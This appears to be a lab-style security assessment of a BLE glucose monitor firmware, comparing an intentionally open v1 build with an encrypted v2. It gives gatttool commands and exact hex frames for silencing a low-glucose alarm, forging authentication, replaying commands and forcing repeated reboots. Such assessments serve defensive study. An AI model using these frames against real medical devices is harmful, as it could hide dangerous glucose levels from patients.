# BLE Security Posture Analysis: GlucoSense v1 vs v2

## Executive Summary

This document provides a BRAT-style security assessment of the GlucoSense BLE glucose monitor firmware, comparing the vulnerable (v1) and secure (v2) builds.

---

## Link-Layer Security Assessment

| Security Control | v1 (OPEN) | v2 (SECURE) | Risk |
|-----------------|-----------|-------------|------|
| **Pairing Mode** | None | LE Secure Connections | CRITICAL |
| **IO Capability** | NoInputNoOutput | DisplayOnly | HIGH |
| **MITM Protection** | Disabled | Passkey Entry | CRITICAL |
| **Bonding** | Disabled | Required | HIGH |
| **Encryption** | None (plaintext) | AES-128-CCM | CRITICAL |
| **Key Size** | N/A | 128-bit | - |
| **Bond Storage** | N/A | NVS Flash | - |

---

## GATT Attack Surface

### v1 - Wide Open

```
Service: Nordic UART (6e400001-...)
├── TX Char (6e400003-...)
│   ├── Properties: NOTIFY
│   └── Permissions: NONE (notify freely)
├── TX CCC Descriptor
│   └── Permissions: READ | WRITE          ← No encryption
└── RX Char (6e400002-...)
    ├── Properties: WRITE | WRITE_NO_RSP
    └── Permissions: WRITE                  ← No encryption

Service: Glucose (0x1808)
├── Glucose Measurement (0x2A18)
│   ├── Properties: READ | NOTIFY
│   └── Permissions: READ                   ← No encryption
└── CCC Descriptor
    └── Permissions: READ | WRITE           ← No encryption

Service: DFU (0xFE59)
└── Buttonless DFU (8ec90003-...)
    ├── Properties: WRITE | INDICATE
    └── Permissions: WRITE                  ← No encryption, triggers reboot!
```

### v2 - Encrypted

```
Service: Nordic UART (6e400001-...)
├── TX CCC Descriptor
│   └── Permissions: READ_ENCRYPT | WRITE_ENCRYPT
└── RX Char (6e400002-...)
    └── Permissions: WRITE_ENCRYPT          ← Requires paired link

Service: Glucose (0x1808)
└── Glucose Measurement (0x2A18)
    └── Permissions: READ_ENCRYPT           ← Requires paired link

Service: DFU (0xFE59)
└── Buttonless DFU (8ec90003-...)
    └── Permissions: WRITE_ENCRYPT          ← Requires paired link
```

---

## Vulnerability Matrix

| Vuln ID | Category | v1 | v2 | CVSS | Description |
|---------|----------|----|----|------|-------------|
| **GS-001** | Link Security | ✗ VULN | ✓ FIXED | 9.8 | No pairing/encryption required |
| **GS-002** | Unauthenticated Write | ✗ VULN | ✓ FIXED | 9.1 | ALARM_SET accepts from any peer |
| **GS-003** | Fake Authentication | ✗ VULN | ✗ VULN | 7.5 | CMD_AUTH accepts any UID |
| **GS-004** | DoS via DFU | ✗ VULN | ✓ FIXED | 7.1 | Unauthenticated reboot trigger |
| **GS-005** | Session Fixation | ✗ VULN | ✗ VULN | 5.3 | Auth state not tied to connection |
| **GS-006** | No Replay Protection | ✗ VULN | ✗ VULN | 6.5 | Protocol has no nonce/sequence |

---

## Detailed Vulnerability Analysis

### GS-001: No Link-Layer Security (v1 only)

**Severity:** CRITICAL (CVSS 9.8)

**Config Diff:**
```diff
# prj.conf (v1) - MISSING:
+ CONFIG_BT_SMP=y
+ CONFIG_BT_BONDABLE=y
+ CONFIG_BT_BONDING_REQUIRED=y
+ CONFIG_BT_SMP_ENFORCE_MITM=y
+ CONFIG_BT_FIXED_PASSKEY=y
```

**ATT Response Comparison:**
```
v1: Write Request → Write Response (success)
v2: Write Request → Error Response (0x0F INSUFFICIENT_ENCRYPTION)
```

**Proof of Concept:**
```bash
# v1: Direct connection, no pairing
gatttool -b <MAC> --char-write-req -a 0x0012 -n 7E00001020200001003F87EF

# v2: Fails until pairing complete
gatttool -b <MAC> --char-write-req -a 0x0012 -n 7E00001020200001003F87EF
# Error: Insufficient encryption
```

**Impact:**
- Any device in BLE range can connect
- All traffic transmitted in plaintext
- No authentication of connecting device
- Full access to all characteristics

---

### GS-002: Unauthenticated ALARM_SET (v1 only)

**Severity:** CRITICAL (CVSS 9.1)

**Vulnerable Code Path:**
```c
// main.c:400-438
case CMD_ALARM_SET: {
    bool want_alarm = (f->payload[0] != 0x00);
    
#ifdef CONFIG_BT_SMP  // ← v1 does NOT define this
    if (!want_alarm && !state.authenticated) {
        // REJECT - v2 only
        return;
    }
#endif
    // v1 FALLS THROUGH - no check!
    set_alarm(false);  // Silences critical alarm
}
```

**Attack Frame:**
```
Silence Alarm:
7E 00 00 10 20 20 00 01 00 3F 87 EF
│        │     │     │  │  │     │
│        │     │     │  │  │     End marker
│        │     │     │  │  CRC-16 (0x873F big-endian)
│        │     │     │  Payload: 0x00 = silence
│        │     │     Payload length: 1 byte
│        │     Command: 0x20 (ALARM_SET)
│        Direction: 0x00 (request)
Start marker
```

**State Before Attack:**
```
glucose_mg_dl: 45
alarm_active: true
LED1: ON (blinking alarm)
```

**State After Attack:**
```
glucose_mg_dl: 45      ← UNCHANGED (still critical!)
alarm_active: false    ← SILENCED
LED1: OFF              ← No visual warning
```

**Medical Impact:** Patient has dangerously low glucose but no alarm. Hypoglycemic event goes unnoticed.

---

### GS-003: Fake Authentication (Both versions)

**Severity:** HIGH (CVSS 7.5)

**Vulnerable Code:**
```c
// main.c:365-390
case CMD_AUTH: {
    // NO verification - accepts ANY 8-byte identifier
    memcpy(state.uid, f->payload, 8);
    state.authenticated = true;  // Always succeeds!
    
    // Echo back the UID (enables replay attacks)
    uint8_t ack[9];
    memcpy(ack, state.uid, 8);
    ack[8] = 0x01; // "accepted"
    send_frame(DIR_ACK, CMD_AUTH, ack, sizeof(ack));
}
```

**Attack Frame:**
```
7E 00 00 10 20 10 00 08 DE AD BE EF CA FE BA BE <crc> EF
                    │   └─────────────────────┘
                    │   Any 8 bytes = "authenticated"
                    CMD_AUTH (0x10)
```

**Why it's vulnerable:**
- No shared secret
- No challenge-response
- No cryptographic verification
- UID is echoed back (replay possible)

**Note:** In v2, this is partially mitigated because the attacker must first pair with the device, but the authentication protocol itself remains weak.

---

### GS-004: DoS via DFU Trigger (v1 only)

**Severity:** HIGH (CVSS 7.1)

**Vulnerable Code:**
```c
// main.c:269-298
static ssize_t dfu_write(...) {
    if (data[0] == 0x01) {
        LOG_WRN("No credential was required. Rebooting in 1s.");
        k_work_schedule(&reboot_work, K_MSEC(1000));
    }
    return len;
}
```

**Attack:**
```bash
# Write 0x01 to DFU characteristic
gatttool -b <MAC> --char-write-req -a <DFU_HANDLE> -n 01
# Device reboots in 1 second
```

**DFU Characteristic:**
```
UUID: 8ec90003-f315-4f60-9fb8-838830daea50
Properties: WRITE | INDICATE
v1 Permissions: WRITE (no encryption)
v2 Permissions: WRITE_ENCRYPT (requires pairing)
```

**Impact:**
- Immediate device reboot
- Loss of real-time glucose monitoring
- Patient loses CGM data during reboot
- Can be triggered repeatedly (permanent DoS)

---

### GS-005: Session Fixation (Both versions)

**Severity:** MEDIUM (CVSS 5.3)

**Issue:**
```c
// Authentication state is per-device, not per-connection
static struct {
    bool authenticated;  // Global, not tied to bt_conn
    uint8_t uid[8];
} state;
```

**Attack Scenario:**
1. Attacker connects, sends CMD_AUTH → `state.authenticated = true`
2. Attacker disconnects
3. Legitimate app connects
4. Attacker reconnects → still authenticated from step 1

**Mitigation Present:**
```c
static void disconnected(...) {
    state.authenticated = false;  // Cleared on disconnect
    memset(state.uid, 0, sizeof(state.uid));
}
```

**Residual Risk:** Race condition window between disconnect and state clear.

---

### GS-006: No Replay Protection (Both versions)

**Severity:** MEDIUM (CVSS 6.5)

**Issue:** Protocol has no:
- Sequence numbers
- Timestamps
- Nonces
- Message authentication codes

**Attack:**
```bash
# Capture valid ALARM_SET frame
# Replay anytime to silence alarm
7E 00 00 10 20 20 00 01 00 3F 87 EF  # Same frame always works
```

**Impact:** Captured commands can be replayed indefinitely.

---

## SMP Configuration Comparison

| Parameter | v1 Value | v2 Value | Security Impact |
|-----------|----------|----------|-----------------|
| `CONFIG_BT_SMP` | undefined | `y` | No SMP = no pairing |
| `CONFIG_BT_BONDABLE` | undefined | `y` | No bonding = no persistent keys |
| `CONFIG_BT_BONDING_REQUIRED` | undefined | `y` | Allows unbonded access |
| `CONFIG_BT_SMP_ENFORCE_MITM` | undefined | `y` | No MITM = passive eavesdrop |
| `CONFIG_BT_FIXED_PASSKEY` | undefined | `y` | No passkey = JustWorks (weak) |
| `CONFIG_BT_SMP_APP_PAIRING_ACCEPT` | undefined | `y` | Auto-accept pairing |

---

## Encryption Key Derivation (v2 only)

```
Pairing Method: Passkey Entry (MITM protected)
Passkey: 123456 (6 digits displayed on device)

Key Hierarchy:
┌─────────────────────────────────────┐
│ Long Term Key (LTK) - 128-bit       │ ← Stored in NVS flash
├─────────────────────────────────────┤
│ Session Key (SK)                    │ ← Derived per-connection
├─────────────────────────────────────┤
│ AES-CCM Encryption                  │ ← All GATT traffic encrypted
└─────────────────────────────────────┘
```

---

## BRAT-Style Findings Summary

### GlucoSense-OPEN (v1)

```
┌────────────────────────────────────────────────────────────────┐
│                    GlucoSense-OPEN (v1)                        │
├────────────────────────────────────────────────────────────────┤
│ [CRITICAL] No pairing required - any device can connect        │
│ [CRITICAL] No encryption - all traffic in plaintext            │
│ [CRITICAL] ALARM_SET accepts unauthenticated commands          │
│ [HIGH]     DFU reboot trigger has no access control            │
│ [HIGH]     CMD_AUTH provides no actual authentication          │
│ [MEDIUM]   No replay protection in protocol                    │
│ [LOW]      Device name reveals product type                    │
├────────────────────────────────────────────────────────────────┤
│ Attack Complexity: LOW                                         │
│ Required Privileges: NONE                                      │
│ User Interaction: NONE                                         │
│ Scope: CHANGED (affects patient health)                        │
└────────────────────────────────────────────────────────────────┘
```

### GlucoSense-SECURE (v2)

```
┌────────────────────────────────────────────────────────────────┐
│                   GlucoSense-SECURE (v2)                       │
├────────────────────────────────────────────────────────────────┤
│ [PASS]     LE Secure Connections pairing required              │
│ [PASS]     AES-128-CCM encryption on all characteristics       │
│ [PASS]     ALARM_SET requires authenticated session            │
│ [PASS]     DFU trigger requires encrypted link                 │
│ [MEDIUM]   CMD_AUTH still accepts any identifier               │
│ [MEDIUM]   No replay protection in protocol                    │
│ [LOW]      Fixed passkey (123456) is predictable               │
├────────────────────────────────────────────────────────────────┤
│ Attack Complexity: HIGH (requires passkey)                     │
│ Required Privileges: Physical proximity + passkey              │
│ User Interaction: REQUIRED (enter passkey)                     │
└────────────────────────────────────────────────────────────────┘
```

---

## Attack Scenarios

### Scenario 1: Silent Alarm Attack (v1 only)

**Attacker Goal:** Silence critical low-glucose alarm without patient knowledge

**Prerequisites:**
- BLE radio within range (~10-100m)
- No pairing required (v1)

**Steps:**
1. Scan for `GlucoSense-OPEN` advertisement
2. Connect to device (no pairing prompt)
3. Discover NUS service and RX characteristic
4. Send ALARM_SET(0x00) frame: `7E 00 00 10 20 20 00 01 00 3F 87 EF`
5. Disconnect

**Result:**
- Alarm LED turns off
- Glucose continues to drop
- Patient unaware of hypoglycemic event

**v2 Defense:** Connection attempt triggers pairing. Without passkey, attacker cannot write to characteristics.

---

### Scenario 2: Denial of Service (v1 only)

**Attacker Goal:** Disable glucose monitoring

**Steps:**
1. Connect to device
2. Write `0x01` to DFU characteristic
3. Device reboots
4. Repeat to prevent monitoring

**v2 Defense:** DFU write requires encrypted link.

---

### Scenario 3: Eavesdropping (v1 only)

**Attacker Goal:** Capture patient glucose data

**Steps:**
1. Use BLE sniffer (Ubertooth, nRF Sniffer)
2. Capture all traffic (unencrypted)
3. Decode STATUS responses for glucose values

**v2 Defense:** All traffic encrypted with AES-128-CCM.

---

## Recommended Mitigations (for real products)

| Issue | Current State | Recommended Mitigation |
|-------|---------------|------------------------|
| Fixed passkey | `123456` | Random passkey per-device, displayed on screen |
| No replay protection | None | Add sequence numbers + HMAC to protocol |
| Fake CMD_AUTH | Accepts any UID | Challenge-response with device-specific secret |
| Session fixation | Cleared on disconnect | Tie auth state to `bt_conn` pointer |
| Predictable behavior | Static responses | Rate limiting, anomaly detection |
| No secure boot | Unsigned firmware | Implement MCUboot with signed images |

---

## Compliance Considerations

| Standard | v1 Status | v2 Status |
|----------|-----------|-----------|
| FDA Cybersecurity Guidance | ✗ Non-compliant | Partial |
| IEC 62443 | ✗ Non-compliant | Partial |
| HIPAA (if PHI transmitted) | ✗ Non-compliant | ✓ Encrypted |
| Bluetooth SIG Security Mode | Mode 1 Level 1 (none) | Mode 1 Level 3 (encrypted) |

---

## References

- Bluetooth Core Specification v5.4, Vol 3 Part H (Security Manager)
- NIST SP 800-121 Rev 2: Guide to Bluetooth Security
- FDA Guidance: Cybersecurity in Medical Devices
- Nordic Semiconductor: nRF Connect SDK Security Documentation
